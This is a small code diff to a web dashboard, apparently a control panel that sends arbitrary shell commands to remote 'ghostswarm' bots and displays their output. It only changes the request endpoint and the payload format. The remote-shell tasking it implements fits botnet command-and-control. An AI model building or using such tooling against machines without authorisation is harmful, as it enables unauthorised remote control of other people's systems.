@@ -151,18 +151,20 @@ document
       const outputBox = document.getElementById("cmdOutput");
       outputBox.textContent = "⏳ Waiting for response...";
       const topic = `ghostswarm/${botId}/command`;
-      const res = await fetch(`/send`, {
+      const res = await fetch(`/api/bots/${botId}/command`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
             topic: topic,
-            command: "shell",
-            payload: { cmd: command },
+            type: "shell",
+            command: command,
             botId: botId,
          }),
       });
 
       const result = await res.json();
+      console.log("Command result:", result);
+
       if (res.ok) {
          outputBox.textContent =
             `✅ ${botId} responded:\n\n` + result.output;
